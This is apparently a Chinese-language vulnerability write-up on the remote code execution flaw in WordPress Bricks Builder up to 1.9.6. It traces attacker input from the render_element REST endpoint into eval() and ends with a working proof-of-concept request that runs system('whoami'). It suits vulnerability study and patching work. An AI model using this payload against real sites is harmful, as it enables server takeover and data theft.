## 影响范围
WordPress Bricks Builder <= 1.9.6

## 漏洞分析
`wp-content/themes/bricks/includes/query.php`

明显看到`$php_query_raw`传入了eval()函数，参数取自于`bricks_render_dynamic_data( $query_vars['queryEditor'], $post_id );`
```PHP
	$query_vars = $settings['query'] ?? [];
...
/**  
 * Use PHP editor * * Returns PHP array with query arguments * * Supported if 'objectType' is 'post', 'term' or 'user'. * No merge query. * * @since 1.9.1  
 */if ( isset( $query_vars['useQueryEditor'] ) && ! empty( $query_vars['queryEditor'] ) && in_array( $object_type, [ 'post','term','user' ] ) ) {  
    $post_id                      = Database::$page_data['preview_or_post_id'];  
    $php_query_raw                = bricks_render_dynamic_data( $query_vars['queryEditor'], $post_id );  
    $query_vars['posts_per_page'] = get_option( 'posts_per_page' );  
  
    // Define an anonymous function that simulates the scope for user code  
    $execute_user_code = function () use ( $php_query_raw ) {  
       $user_result = null; // Initialize a variable to capture the result of user code  
  
       // Capture user code output using output buffering       ob_start();  
       $user_result = eval( $php_query_raw ); // Execute the user code  
       ob_get_clean(); // Get the captured output  
  
       return $user_result; // Return the user code result  
    };  
  
    ob_start();
```

跟入`bricks_render_dynamic_data`，函数仅做过滤用

```PHP
//wp-content/themes/bricks/functions.php
function bricks_render_dynamic_data( $content, $post_id = 0, $context = 'text' ) {  
    return \Bricks\Integrations\Dynamic_Data\Providers::render_content( $content, $post_id, $context );  
}
//wp-content/themes/bricks/includes/integrations/dynamic-data/providers.php
public static function render_content( $content, $post_id = 0, $context = 'text' ) {  
    // Return: Content is a flat array (Example: 'user_role' element conditions @since 1.5.6)  
    if ( is_array( $content ) && isset( $content[0] ) ) {  
       return $content;  
    }  
  
    // Support for dynamic data picker and input text (@since 1.5)  
    $content = ! empty( $content['name'] ) ? $content['name'] : (string) $content;  
  
    // Return: $content doesn't contain opening DD tag character '{' (@since 1.5)  
    if ( strpos( $content, '{' ) === false ) {  
       return $content;  
    }  
  
    // Strip slashes for DD "echo" function to allow DD preview render in builder (@since 1.5.3)  
    if ( strpos( $content, '{echo:' ) !== false ) {  
       $content = stripslashes( $content );  
    }  
  
    $post_id = empty( $post_id ) ? get_the_ID() : $post_id;  
    $post    = get_post( $post_id );  
  
    /**  
     * Set the correct post when previewing     *     * TODO NOTE: Not in use as it causes issues with the preview of elements in the builder  
     * that return query results not generated through the query builder.  
     * Examples: Posts, Products, Related posts elements     *     * @since 1.9.5  
     */    // if (  
    // \Bricks\Helpers::is_bricks_preview() &&    // ! \Bricks\Query::is_looping() &&    // isset( \Bricks\Database::$page_data['preview_or_post_id'] )    // ) {    // $post = get_post( \Bricks\Database::$page_data['preview_or_post_id'] );    // }  
    return apply_filters( 'bricks/dynamic_data/render_content', $content, $post, $context );  
}
```

`prepare_query_vars_from_settings`的调用就在Query类的`__construct`中，从代码中明显看出只要`$element`中id为空即可进入else触发`prepare_query_vars_from_settings`

![](attachments/Pasted%20image%2020241020105213.png)

```PHP
public static function get_query_by_element_id( $element_id = '', $is_dynamic_data = false ) {  
    if ( empty( $element_id ) ) {  
       return false;  
    }  
  
    $query           = false;  
    $history_queries = self::$query_history;  
  
    // Check if any query history element_id matches the given element_id  
    if ( ! empty( $history_queries ) ) {  
       $query_history_id = self::generate_query_history_id( $element_id );  
  
       if ( isset( $history_queries[ $query_history_id ] ) ) {  
          $query = $history_queries[ $query_history_id ];  
       }  
  
       // If using in dynamic data, and no query history found, maybe user wants to get query history based on $element_id  
       if ( ! $query && $is_dynamic_data && self::is_looping() ) {  
          if ( isset( $history_queries[ $element_id ] ) ) {  
             $query = $history_queries[ $element_id ];  
          }  
       }  
    }  
  
    return $query;  
}
```
`wp-content/themes/bricks/includes/ajax.php#render_element`将Query类实例化

但是在第一个实例化的位置`$loop_element`为false无法进入，但是在下面`$element`可控，可以通过`$element_class_name`实例化指定类

```PHP
if ( ! empty( $loop_element ) ) {  
    $query = new Query( $loop_element );  
  
    if ( ! empty( $query->count ) ) {  
       $query->is_looping = true;  
  
       // NOTE: Use array_shift because not all the results are sequential arrays (e.g. JetEngine)  
       $query->loop_object = $query->object_type == 'post' ? $query->query_result->posts[0] : array_shift( $query->query_result );  
    }  
}
...
// Init element class (i.e. new Bricks\Element_Alert( $element ))  
$element_name       = ! empty( $element['name'] ) ? $element['name'] : '';  
$element_class_name = isset( Elements::$elements[ $element_name ]['class'] ) ? Elements::$elements[ $element_name ]['class'] : false;
if ( class_exists( $element_class_name ) ) {  
    $element['is_frontend'] = false;  
  
    $element_instance = new $element_class_name( $element );  
    $element_instance->load();  
  
    // Init element: enqueue styles/scripts, render element  
    ob_start();  
    $element_instance->init();  
    $response = ob_get_clean();  
    // NOTE: stripslashes no longer in use (@since 1.8.5) as they caused unicode characters to be escaped (e.g. \u00a0) (#862jxcrde; #862jxw1w7)  
    // $response = stripslashes( $response );}
```

`wp-content/themes/bricks/includes/elements.php`中指名了可以实例化的类有

![](attachments/Pasted%20image%2020241020112523.png)

查找白名单类中对Query类的调用

![](attachments/Pasted%20image%2020241020123253.png)

在`wp-content/themes/bricks/includes/elements/container.php#Element_Container`有rander函数实例化Query

![](attachments/Pasted%20image%2020241020123559.png)

在其继承的父类`wp-content/themes/bricks/includes/elements/base.php`中init函数调用render函数

![](attachments/Pasted%20image%2020241020124020.png)
`__construct`为element赋值

```PHP
public function __construct( $element = null ) {  
    $this->element           = $element;  
    $this->label             = $this->get_label();  
    $this->keywords          = $this->get_keywords();  
    $this->is_frontend       = isset( $element['is_frontend'] ) ? $element['is_frontend'] : bricks_is_frontend();  
    $this->id                = ! empty( $element['id'] ) ? $element['id'] : Helpers::generate_random_id( false );  
    $this->settings          = ! empty( $element['settings'] ) ? $element['settings'] : [];  
    $this->nestable_item     = $this->get_nestable_item();  
    $this->nestable_children = $this->get_nestable_children();  
    $this->nestable_hide     = Capabilities::current_user_has_full_access() === false;  
  
    // To distinguish non-layout nestables (slider-nested, etc.) in Vue render  
    if ( $this->nestable && ! $this->is_layout_element() ) {  
       $this->nestable_html = true;  
    }  
  
    // Element-specific theme style settings  
    if ( ! empty( $element['themeStyles'] ) ) {  
       $this->theme_styles = $element['themeStyles'];  
    } elseif ( ! empty( Theme_Styles::$active_settings[ $this->name ] ) ) {  
       $this->theme_styles = Theme_Styles::$active_settings[ $this->name ];  
    }  
  
    $this->tag = $this->get_tag();  
}
```

`init()`函数中对render的调用

![](attachments/Pasted%20image%2020241020125113.png)


在这里返回先前ajax.php中，在此时将`$element['name']`设置为container后自然会按照上面的调用去实例化到`Element_Container`类

![](attachments/Pasted%20image%2020241020125019.png)

那么在下面调用init()最后实例化Query也就完成RCE的过程

## POC
```JSON
//POC
POST /wp-json/bricks/v1/render_element
Content-Type: application/json
{
"postId":"1",
"nonce":"3d6020fb9a",
"element":{
    "name":"container",
    "settings":{
        "hasLoop":"true",
        "query":{
            "useQueryEditor":true,
            "queryEditor":"system('whoami');throw new Exception();", //throw new Exception()是为了抛错回显
            "objectType":"post"
        }
    }
}
}
```